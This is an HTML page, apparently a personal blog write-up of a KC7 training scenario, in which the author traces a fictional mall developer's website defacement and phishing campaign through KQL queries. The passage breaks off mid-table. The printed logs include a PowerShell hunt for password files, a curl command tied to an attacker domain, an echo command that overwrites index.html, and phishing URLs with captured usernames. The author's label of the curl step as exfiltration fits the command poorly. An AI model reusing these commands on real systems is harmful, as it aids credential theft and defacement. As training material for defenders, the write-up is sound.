@@ -1,0 +1,2517 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>shoutvoid - kc7cyber writeup - moderate - frognado in valdoria</title>
+    <link rel = "stylesheet" href = "../../../css/variables.css">
+    <link rel = "stylesheet" href = "../../../css/style.css">
+    <link rel = "stylesheet" href = "../../../css/kc7writeup.css">
+  </head>
+  <body id="top">
+    <div class="sidebar">
+      <header><!--website header-->
+        <h1>shoutvoid</h1>
+        <p>Aspiring cybersecurity professional</p>
+      </header><!--website header-->
+      <nav class="site-nav"> <!--site-wide navigation-->
+        <a href="../../../index.html">About</a>
+        <a href="../../writeups.html">Writeups</a>
+      </nav> <!--site-wide navigation-->
+      <nav class="page-nav" id="page-navigation"> <!--page navigation sidebar-->
+        <ol class="page-toc"><!--page toc-->
+          <a class="skip" href="#page-main">Skip to main content</a>
+          <li><a href="#intro">Introduction</a></li><!--link to intro-->
+          <li><a href=#sections>Sections</a><!--all sections-->
+            <ol class="section-toc"><!--section-toc-->
+              <li class="section1-toc"><!--individual section toc-->
+                <a href=#section1>Section 1 - Maybe it's just a tadpole? 😢👀</a>
+              </li><!--individual section toc-->
+              <li class="section2-toc"><!--individual section toc-->
+                <a href=#section2>Section 2 - KQL 101 📚</a>
+              </li><!--individual section toc-->
+              <li class="section3-toc"><!--individual section toc-->
+                <a href=#section3>Section 3 - Alright it’s definitely an angry frog or two 🥵😨</a>
+              </li><!--individual section toc-->
+              <li class="section4-toc"><!--individual section toc-->
+                <a href=#section4>Section 4 - Nope, it’s a full on frognado!!!! 🐸🌪️😱</a>
+              </li><!--individual section toc-->
+            </ol><!--section-toc-->
+          </li><!--all sections-->
+        </ol> <!--page-toc class-->
+      </nav> <!--page navigation sidebar-->
+      <footer><!--website footer-->
+        <p>Made with vanilla HTML + CSS by shoutvoid</p>
+        <address>
+          <a href="mailto:shoutvoid@proton.me">shoutvoid@proton.me</a>
+          <a href="https://github.com/ShoutVoid">GitHub</a>
+          <a href="https://play.picoctf.org/users/shoutvoid">picoCTF</a>
+          <a href="https://kc7cyber.com/profile/shoutvoid">KC7Cyber</a>
+        </address>
+      </footer><!--website footer-->
+    </div>
+    <main id="page-main"> <!--main page content-->
+      <article id="intro"> <!--introduction-->
+        <h1>Frognado In Valdoria</h1>
+        <p>We return to the futuristic, fairly-idyllic city of Valdoria; our successful investigation regarding <a href="../easy/valdytimes.html">the Valdoria Times scandal</a> has led to FramtidX Development Corp. to request our services after their webpage was defaced; the corporation--the largest mall developer with a massive project blessed by the current mayor (whose opponent had been targeted in the previous scandal)--fears the worst.</p>
+        <p>The player is tasked with finding out how the attackers defaced the webpage to begin with, and if they've done anything else (not-really-a-spoiler: of course they did).</p>
+      </article> <!--introduction-->
+      <article id=sections><!--the game sections-->
+        <h2>Sections</h2>
+        <section id="section1"><!--section 1-->
+          <h3>Section 1 - Maybe it's just a tadpole? 😢👀</h3>
+          <p>A FramtidX employee informs us that their webpage has been hacked and defaced (MITRE T1491 [<a href="https://attack.mitre.org/techniques/T1491/">ATT&amp;CK</a>] [<a href="https://d3fend.mitre.org/offensive-technique/attack/T1491/">D3FEND</a>]). The threat actor calls themselves "Shadow Truth" and make heavy use of frog imagery. Since their public-facing website was targeted, it would be a good idea to contact the person in charge of maintaining it.</p>
+          <pre><kbd>Employees
+| summarize count() by role</kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>role</th>
+                    <th>count_</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>Developer</td>
+                    <td>474</td>
+                  </tr>
+                  <tr>
+                    <td>Architect</td>
+                    <td>100</td>
+                  </tr>
+                  <tr>
+                    <td>Marketing Specialist</td>
+                    <td>50</td>
+                  </tr>
+                  <tr>
+                    <td>Project Manager</td>
+                    <td>40</td>
+                  </tr>
+                  <tr>
+                    <td>HR Manager</td>
+                    <td>40</td>
+                  </tr>
+                  <tr>
+                    <td>Intern</td>
+                    <td>19</td>
+                  </tr>
+                  <tr>
+                    <td>Sales Representative</td>
+                    <td>10</td>
+                  </tr>
+                  <tr>
+                    <td>Quality Assurance Engineer</td>
+                    <td>10</td>
+                  </tr>
+                  <tr>
+                    <td>IT Specialist</td>
+                    <td>5</td>
+                  </tr>
+                  <tr>
+                    <td>Lead Developer</td>
+                    <td>3</td>
+                  </tr>
+                  <tr>
+                    <td>Chief Architect</td>
+                    <td>2</td>
+                  </tr>
+                  <tr>
+                    <td>Web Administrator</td>
+                    <td>1</td>
+                  </tr>
+                  <tr>
+                    <td>CEO</td>
+                    <td>1</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>This query shows that there's a single Web Administrator; looking them up on the <samp>Employees</samp> table shows that they're named Anita Bath (email address <samp>anita_bath@framtidxdevcorp.com</samp>, IP address <samp>10.10.0.8</samp>, username <samp>anbath</samp> and hostname <samp>MYZB-LAPTOP</samp>); crucially, Anita doesn't have multi-factor authentication enabled. After contacting her and discussing the matter, she insists she didn't have anything to do with the defacement "even if it looks like she did [it]."</p>
+          <p>While an insider threat is always possible, it's just as likely that her device(s) or account(s) were compromised by the threat actor; I'll take her at her word unless there's evidence to the contrary. Furthermore, the threat actor gave us their name; it's possible it'll show up among the processes executed on the Web Administrator's device.</p>
+          <pre><kbd>Employees
+| where role == "Web Administrator"
+| distinct hostname
+| lookup ProcessEvents on $left.hostname == $right.hostname
+| where process_commandline has "Shadow Truth"</kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>hostname</th>
+                    <th>timestamp</th>
+                    <th>parent_process_name</th>
+                    <th>parent_process_hash</th>
+                    <th>process_commandline</th>
+                    <th>process_name</th>
+                    <th>process_hash</th>
+                    <th>username</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>MYZB-LAPTOP</td>
+                    <td>2024-07-10 11:45:50.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>cmd.exe /C echo ^^&lt;html^>^^&lt;head^>^^&lt;title^>Hacked by Shadow Truth^&lt;/title^>^^&lt;/head^>^^&lt;body^>^^&lt;h1^>Hacked by Shadow Truth!^&lt;/h1^>^^&lt;p^>Your security is a joke. We have exposed your secrets for all to see.^&lt;/p^>^^&lt;p^>Enjoy the memes!^&lt;/p^>^^&lt;img src="images/frog_mall_meme1.jpg" alt="Hacked Meme"^>^^&lt;img src="images/frog_mall_meme2.jpg" alt="Hacked Meme"^>^^&lt;/body^>^^&lt;/html^> ^ \\\\web-server\\inetpub\\wwwroot\\index.html</td>
+                    <td>cmd.exe</td>
+                    <td>f8b185d9e47b954aac6abded83ab1c0755640ae674905197e509d116522e96c3</td>
+                    <td>anbath</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>Using the <samp>echo</samp> command, they overwrote the contents of <samp>index.html</samp> (the home page) with a simple HTML defacement message; the images are stored in the <samp>images</samp> directory on the Web Administrator's own device. They might've been downloaded off an attacker-controlled server. The images are <samp>frog_mall_meme1.jpg</samp> and <samp>frog_mall_meme2.jpg</samp>.</p>
+          <pre><kbd>Employees
+| where role == "Web Administrator"
+| distinct hostname
+| lookup ProcessEvents on $left.hostname == $right.hostname
+| where process_commandline contains "frog_mall_meme"</kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <caption>This table has been redacted; it only shows the most relevant findings, rather than the entire output of the KQL query above.</caption>
+                <thead>
+                  <tr>
+                    <th>hostname</th>
+                    <th>timestamp</th>
+                    <th>parent_process_name</th>
+                    <th>parent_process_hash</th>
+                    <th>process_commandline</th>
+                    <th>process_name</th>
+                    <th>process_hash</th>
+                    <th>username</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>MYZB-LAPTOP</td>
+                    <td>2024-07-10 10:53:37.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>cmd.exe /C copy C:\Users\anbath\Downloads\frog_mall_meme1.jpg C:\inetpub\wwwroot\images\frog_mall_meme1.jpg</td>
+                    <td>cmd.exe</td>
+                    <td>5f6bdcdf580d9837ac589aa7f6cafbfaa656934049ee2cd6addb40736a4899dc</td>
+                    <td>anbath</td>
+                  </tr>
+                  <tr>
+                    <td>MYZB-LAPTOP</td>
+                    <td>2024-07-10 11:16:37.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>cmd.exe /C copy C:\Users\anbath\Downloads\frog_mall_meme2.jpg C:\inetpub\wwwroot\images\frog_mall_meme2.jpg</td>
+                    <td>cmd.exe</td>
+                    <td>1c5ebf66638bfa0e5af0f75e00e6c5802441f1a4a6ab313dfd15251fd28b39e9</td>
+                    <td>anbath</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>The images were downloaded shortly before the defacement; I check from <i>where</i> by querying <samp>OutboundNetworkEvents</samp>:</p>
+          <pre><kbd>Employees
+| where role == "Web Administrator"
+| distinct ip_addr
+| lookup OutboundNetworkEvents on $left.ip_addr == $right.src_ip
+| where url contains "frog_mall_meme"</kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>ip_addr</th>
+                    <th>timestamp</th>
+                    <th>method</th>
+                    <th>user_agent</th>
+                    <th>url</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>10.10.0.8</td>
+                    <td>2024-07-10 10:52:58.0000</td>
+                    <td>GET</td>
+                    <td>Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0</td>
+                    <td>https://ronniesdankmemes.com/frog_mall_meme1.jpg</td>
+                  </tr>
+                  <tr>
+                    <td>10.10.0.8</td>
+                    <td>2024-07-10 10:52:58.0000</td>
+                    <td>GET</td>
+                    <td>Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0</td>
+                    <td>https://ronniesdankmemes.com/frog_mall_meme2.jpg</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>The threat actors might be related to the ones that compromised the Valdorian Times (see <a href="../easy/valdytimes.html">my investigation on the matter</a>), given the domain the images were downloaded from: <samp>ronniesdankmemes.com</samp>, a clear reference to the Valdorian Times employee that got her personal data exfiltrated during said event.</p>
+          <p>A <samp>lookup</samp> for this hostname against <samp>PassiveDns</samp> doesn't reveal any IPs.</p>
+          <p>Since all sources point to Anita's computer being used, her password(s) must've been compromised at some point, perhaps stolen straight from her device.</p>
+          <pre><kbd>Employees
+| where role == "Web Administrator"
+| distinct hostname
+| lookup ProcessEvents on $left.hostname == $right.hostname
+| where process_commandline contains "password"</kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>hostname</th>
+                    <th>timestamp</th>
+                    <th>parent_process_name</th>
+                    <th>parent_process_hash</th>
+                    <th>process_commandline</th>
+                    <th>process_name</th>
+                    <th>process_hash</th>
+                    <th>username</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>MYZB-LAPTOP</td>
+                    <td>2024-07-09 15:41:29.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>Get-ChildItem -Path C:\Users\anbath\Documents\* -Include *password* -Recurse</td>
+                    <td>powershell.exe</td>
+                    <td>2b3ebd34bd0d48b1fcbd51636669401a0107bdb052862646a7f9eb7411aff0bb</td>
+                    <td>anbath</td>
+                  </tr>
+                  <tr>
+                    <td>MYZB-LAPTOP</td>
+                    <td>2024-07-10 10:28:26.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>curl.exe -o C:\ProgramData\Heartburn\mypasswordsnstuff.txt https://newdevelopmentupdates.org/mypasswordsnstuff.txt</td>
+                    <td>powershell.exe</td>
+                    <td>6fad8666e6b9a1be4764a3b719a3747d11b95ebdbe4b0c6182834e8ff0d9ea99</td>
+                    <td>anbath</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>Indeed, the threat actors used <samp>Get-ChildItem</samp> to get a list of all files that contain the string <samp>password</samp>, recursively across subfolders. The next day, they used <samp>curl</samp> to exfiltrate a list of credentials, likely built off the files found using <samp>Get-ChildItem</samp>. The staging folder for these operations is <samp>Heartburn</samp>, located in the target's <samp>ProgramData</samp>; this was also the name of the staging folder used by the threat actors of the Azure Crest incident (see <a href="azurecrest.html">my investigation</a> on the matter); they're either related or using the same malware packages. Looking for this directory or its path on the <samp>FileCreationEvents</samp> table doesn't return any hits, however.</p>
+          <p>The passwords were uploaded to <samp>newdevelopmentupdates.org</samp>; querying <samp>PassiveDns</samp> does reveal two distinct IP addresses this time:</p>
+          <pre><kbd>PassiveDns
+| where domain == "newdevelopmentupdates.org"
+| distinct ip
+//2 ips</kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>ip</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>239.72.6.37</td>
+                  </tr>
+                  <tr>
+                    <td>239.72.6.38</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>Running a recursive <samp>lookup</samp> to find any other domains reveals:</p>
+          <pre><kbd>PassiveDns
+| where domain == "newdevelopmentupdates.org"
+| distinct ip
+| lookup PassiveDns on $left.ip == $right.ip
+| distinct domain
+//2 domains</kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>domain</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>newdevelopmentupdates.org</td>
+                  </tr>
+                  <tr>
+                    <td>greenprojectnews.net</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>With these domains and IP addresses I can investigate how Anita was compromised, and if anyone else was also targeted (as part of a larger campaign). I checked if any employees received emails containing these domains using:</p>
+          <pre><kbd>let bad_domains =
+PassiveDns
+| where domain == "newdevelopmentupdates.org"
+| distinct ip
+| lookup PassiveDns on $left.ip == $right.ip
+| distinct domain; //2 domains
+Email
+| where tostring(parse_url(link).Host) in (bad_domains)</kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>timestamp</th>
+                    <th>sender</th>
+                    <th>reply_to</th>
+                    <th>recipient</th>
+                    <th>subject</th>
+                    <th>verdict</th>
+                    <th>link</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>2024-06-26 13:51:20.0000</td>
+                    <td>alex_johnson@framtidxdevcorp.com</td>
+                    <td>alex_johnson@framtidxdevcorp.com</td>
+                    <td>johanna_karlsson@framtidxdevcorp.com</td>
+                    <td>Urgent: Security Update Required</td>
+                    <td>CLEAN</td>
+                    <td>http://newdevelopmentupdates.org/public/signin</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-26 14:32:20.0000</td>
+                    <td>alex_johnson@framtidxdevcorp.com</td>
+                    <td>alex_johnson@framtidxdevcorp.com</td>
+                    <td>erik_bjorn@framtidxdevcorp.com</td>
+                    <td>Important: Architectural Plan Changes</td>
+                    <td>CLEAN</td>
+                    <td>https://greenprojectnews.net/online/images/modules/share/login.html</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-26 14:32:20.0000</td>
+                    <td>alex_johnson@framtidxdevcorp.com</td>
+                    <td>alex_johnson@framtidxdevcorp.com</td>
+                    <td>sofia_lindgren@framtidxdevcorp.com</td>
+                    <td>Important: Architectural Plan Changes</td>
+                    <td>CLEAN</td>
+                    <td>https://greenprojectnews.net/online/images/modules/share/login.html</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-26 15:16:20.0000</td>
+                    <td>alex_johnson@framtidxdevcorp.com</td>
+                    <td>alex_johnson@framtidxdevcorp.com</td>
+                    <td>anita_bath@framtidxdevcorp.com</td>
+                    <td>Web Server Credentials Update</td>
+                    <td>CLEAN</td>
+                    <td>https://greenprojectnews.net/share/modules/files/share/enter</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-26 15:52:20.0000</td>
+                    <td>alex_johnson@framtidxdevcorp.com</td>
+                    <td>alex_johnson@framtidxdevcorp.com</td>
+                    <td>jennifer_owens@framtidxdevcorp.com</td>
+                    <td>Urgent: Security Update Required</td>
+                    <td>CLEAN</td>
+                    <td>https://greenprojectnews.net/modules/sign_in</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-26 15:52:20.0000</td>
+                    <td>alex_johnson@framtidxdevcorp.com</td>
+                    <td>alex_johnson@framtidxdevcorp.com</td>
+                    <td>marie_doty@framtidxdevcorp.com</td>
+                    <td>Urgent: Security Update Required</td>
+                    <td>CLEAN</td>
+                    <td>https://greenprojectnews.net/modules/sign_in</td>
+                  </tr>
+                  <tr>
+                    <td>2024-06-26 15:52:20.0000</td>
+                    <td>alex_johnson@framtidxdevcorp.com</td>
+                    <td>alex_johnson@framtidxdevcorp.com</td>
+                    <td>jennifer_owens@framtidxdevcorp.com</td>
+                    <td>Urgent: Security Update Required</td>
+                    <td>CLEAN</td>
+                    <td>https://greenprojectnews.net/modules/sign_in</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>A total of 6 distinct employees were targeted (Jennifer Owens was targeted twice for reasons unknown); the emails received had alarming subject lines, came from what should be a trusted source (Developer Alex Johnson), and all attached URLs lead to fake login pages to steal credentials. The targeted employees (incl. Alex Johnson) are:</p>
+          <pre><kbd>let bad_domains =
+PassiveDns
+| where domain == "newdevelopmentupdates.org"
+| distinct ip
+| lookup PassiveDns on $left.ip == $right.ip
+| distinct domain; //2 domains
+let T =
+Email
+| where tostring(parse_url(link).Host) in (bad_domains)
+| distinct sender, recipient;
+T
+| project ["employee_list"] = sender
+| union (T | project ["employee_list"] = recipient)
+| distinct employee_list
+| lookup Employees on $left.employee_list == $right.email_addr</kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>employee_list</th>
+                    <th>hire_date</th>
+                    <th>name</th>
+                    <th>user_agent</th>
+                    <th>ip_addr</th>
+                    <th>username</th>
+                    <th>role</th>
+                    <th>hostname</th>
+                    <th>mfa_enabled</th>
+                    <th>company_domain</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>marie_doty@framtidxdevcorp.com</td>
+                    <td>2021-12-06 00:00:00.0000</td>
+                    <td>Marie Doty</td>
+                    <td>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36</td>
+                    <td>10.10.0.69</td>
+                    <td>madoty</td>
+                    <td>Sales Representative</td>
+                    <td>APUV-LAPTOP</td>
+                    <td>False</td>
+                    <td>framtidxdevcorp.com</td>
+                  </tr>
+                  <tr>
+                    <td>johanna_karlsson@framtidxdevcorp.com</td>
+                    <td>2021-12-19 00:00:00.0000</td>
+                    <td>Johanna Karlsson</td>
+                    <td>Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36</td>
+                    <td>10.10.0.6</td>
+                    <td>jokarlsson</td>
+                    <td>CEO</td>
+                    <td>BLVR-MACHINE</td>
+                    <td>False</td>
+                    <td>framtidxdevcorp.com</td>
+                  </tr>
+                  <tr>
+                    <td>sofia_lindgren@framtidxdevcorp.com</td>
+                    <td>2022-01-20 00:00:00.0000</td>
+                    <td>Sofia Lindgren</td>
+                    <td>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Safari/537.36</td>
+                    <td>10.10.0.18</td>
+                    <td>solindgren</td>
+                    <td>Chief Architect</td>
+                    <td>VJVS-MACHINE</td>
+                    <td>False</td>
+                    <td>framtidxdevcorp.com</td>
+                  </tr>
+                  <tr>
+                    <td>anita_bath@framtidxdevcorp.com</td>
+                    <td>2023-04-26 00:00:00.0000</td>
+                    <td>Anita Bath</td>
+                    <td>Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0</td>
+                    <td>10.10.0.8</td>
+                    <td>anbath</td>
+                    <td>Web Administrator</td>
+                    <td>MYZB-LAPTOP</td>
+                    <td>False</td>
+                    <td>framtidxdevcorp.com</td>
+                  </tr>
+                  <tr>
+                    <td>erik_bjorn@framtidxdevcorp.com</td>
+                    <td>2023-06-07 00:00:00.0000</td>
+                    <td>Erik Bjorn</td>
+                    <td>Mozilla/5.0 (Windows NT 6.3; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0</td>
+                    <td>10.10.0.3</td>
+                    <td>erbjorn</td>
+                    <td>Chief Architect</td>
+                    <td>LRJP-DESKTOP</td>
+                    <td>True</td>
+                    <td>framtidxdevcorp.com</td>
+                  </tr>
+                  <tr>
+                    <td>jennifer_owens@framtidxdevcorp.com</td>
+                    <td>2023-10-20 00:00:00.0000</td>
+                    <td>Jennifer Owens</td>
+                    <td>Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36</td>
+                    <td>10.10.0.72</td>
+                    <td>jeowens</td>
+                    <td>Sales Representative</td>
+                    <td>DVD0-LAPTOP</td>
+                    <td>True</td>
+                    <td>framtidxdevcorp.com</td>
+                  </tr>
+                  <tr>
+                    <td>alex_johnson@framtidxdevcorp.com</td>
+                    <td>2024-05-01 00:00:00.0000</td>
+                    <td>Alex Johnson</td>
+                    <td>Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36</td>
+                    <td>10.10.0.2</td>
+                    <td>aljohnson</td>
+                    <td>Developer</td>
+                    <td>HWYH-LAPTOP</td>
+                    <td>True</td>
+                    <td>framtidxdevcorp.com</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>Per <samp>summarize count() by role</samp>, a developer, CEO and web administrator each were targeted, along with two chief architects and two sales representatives. Anita Bath was among the targeted, as the sole web developer; note that most don't have MFA enabled; Anita Bath doesn't have it, but Alex Johnson--who evidently was compromised--does have it enabled. To confirm who clicked the links, I use this query:</p>
+          <pre><kbd>let bad_domains =
+PassiveDns
+| where domain == "newdevelopmentupdates.org"
+| distinct ip
+| lookup PassiveDns on $left.ip == $right.ip
+| distinct domain; //2 domains
+let T =
+Email
+| where tostring(parse_url(link).Host) in (bad_domains)
+| distinct sender, recipient;
+T
+| project ["employee_list"] = sender
+| union (T | project ["employee_list"] = recipient)
+| distinct employee_list
+| lookup Employees on $left.employee_list == $right.email_addr
+| distinct role, name, ip_addr
+| lookup OutboundNetworkEvents on $left.ip_addr == $right.src_ip
+| where tostring(parse_url(url).Host) in (bad_domains)</kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>role</th>
+                    <th>name</th>
+                    <th>ip_addr</th>
+                    <th>timestamp</th>
+                    <th>method</th>
+                    <th>user_agent</th>
+                    <th>url</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>CEO</td>
+                    <td>Johanna Karlsson</td>
+                    <td>10.10.0.6</td>
+                    <td>2024-06-26 14:34:20.0000</td>
+                    <td>GET</td>
+                    <td>Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36</td>
+                    <td>http://newdevelopmentupdates.org/public/signin</td>
+                  </tr>
+                  <tr>
+                    <td>CEO</td>
+                    <td>Johanna Karlsson</td>
+                    <td>10.10.0.6</td>
+                    <td>2024-06-26 14:34:22.0000</td>
+                    <td>GET</td>
+                    <td>Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36</td>
+                    <td>http://newdevelopmentupdates.org/public/signin?username=jokarlsson&amp;password=**********</td>
+                  </tr>
+                  <tr>
+                    <td>Chief Architect</td>
+                    <td>Sofia Lindgren</td>
+                    <td>10.10.0.18</td>
+                    <td>2024-06-26 14:57:20.0000</td>
+                    <td>GET</td>
+                    <td>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Safari/537.36</td>
+                    <td>https://greenprojectnews.net/online/images/modules/share/login.html</td>
+                  </tr>
+                  <tr>
+                    <td>Chief Architect</td>
+                    <td>Sofia Lindgren</td>
+                    <td>10.10.0.18</td>
+                    <td>2024-06-26 14:57:22.0000</td>
+                    <td>GET</td>
+                    <td>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Safari/537.36</td>
+                    <td>https://greenprojectnews.net/online/images/modules/share/login.html?username=solindgren&amp;password=**********</td>
+                  </tr>
+                  <tr>
+                    <td>Chief Architect</td>
+                    <td>Erik Bjorn</td>
+                    <td>10.10.0.3</td>
+                    <td>2024-06-26 15:11:20.0000</td>
+                    <td>GET</td>
+                    <td>Mozilla/5.0 (Windows NT 6.3; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0</td>
+                    <td>https://greenprojectnews.net/online/images/modules/share/login.html</td>
+                  </tr>
+                  <tr>
+                    <td>Chief Architect</td>
+                    <td>Erik Bjorn</td>
+                    <td>10.10.0.3</td>
+                    <td>2024-06-26 15:11:22.0000</td>
+                    <td>GET</td>
+                    <td>Mozilla/5.0 (Windows NT 6.3; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0</td>
+                    <td>https://greenprojectnews.net/online/images/modules/share/login.html?username=erbjorn&amp;password=**********</td>
+                  </tr>
+                  <tr>
+                    <td>Web Administrator</td>
+                    <td>Anita Bath</td>
+                    <td>10.10.0.8</td>
+                    <td>2024-06-26 15:24:20.0000</td>
+                    <td>GET</td>
+                    <td>Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0</td>
+                    <td>https://greenprojectnews.net/share/modules/files/share/enter</td>
+                  </tr>
+                  <tr>
+                    <td>Web Administrator</td>
+                    <td>Anita Bath</td>
+                    <td>10.10.0.8</td>
+                    <td>2024-06-26 15:24:22.0000</td>
+                    <td>GET</td>
+                    <td>Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0</td>
+                    <td>https://greenprojectnews.net/share/modules/files/share/enter?username=anbath&amp;password=**********</td>
+                  </tr>
+                  <tr>
+                    <td>Sales Representative</td>
+                    <td>Marie Doty</td>
+                    <td>10.10.0.69</td>
+                    <td>2024-06-26 15:57:20.0000</td>
+                    <td>GET</td>
+                    <td>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36</td>
+                    <td>https://greenprojectnews.net/modules/sign_in</td>
+                  </tr>
+                  <tr>
+                    <td>Sales Representative</td>
+                    <td>Marie Doty</td>
+                    <td>10.10.0.69</td>
+                    <td>2024-06-26 15:57:22.0000</td>
+                    <td>GET</td>
+                    <td>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36</td>
+                    <td>https://greenprojectnews.net/modules/sign_in?username=madoty&amp;password=**********</td>
+                  </tr>
+                  <tr>
+                    <td>Sales Representative</td>
+                    <td>Jennifer Owens</td>
+                    <td>10.10.0.72</td>
+                    <td>2024-06-26 16:12:20.0000</td>
+                    <td>GET</td>
+                    <td>Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36</td>
+                    <td>https://greenprojectnews.net/modules/sign_in</td>
+                  </tr>
+                  <tr>
+                    <td>Sales Representative</td>
+                    <td>Jennifer Owens</td>
+                    <td>10.10.0.72</td>
+                    <td>2024-06-26 16:12:22.0000</td>
+                    <td>GET</td>
+                    <td>Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36</td>
+                    <td>https://greenprojectnews.net/modules/sign_in?username=jeowens&amp;password=**********</td>
+                  </tr>
+                  <tr>
+                    <td>Sales Representative</td>
+                    <td>Jennifer Owens</td>
+                    <td>10.10.0.72</td>
+                    <td>2024-06-26 16:13:20.0000</td>
+                    <td>GET</td>
+                    <td>Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36</td>
+                    <td>https://greenprojectnews.net/modules/sign_in</td>
+                  </tr>
+                  <tr>
+                    <td>Sales Representative</td>
+                    <td>Jennifer Owens</td>
+                    <td>10.10.0.72</td>
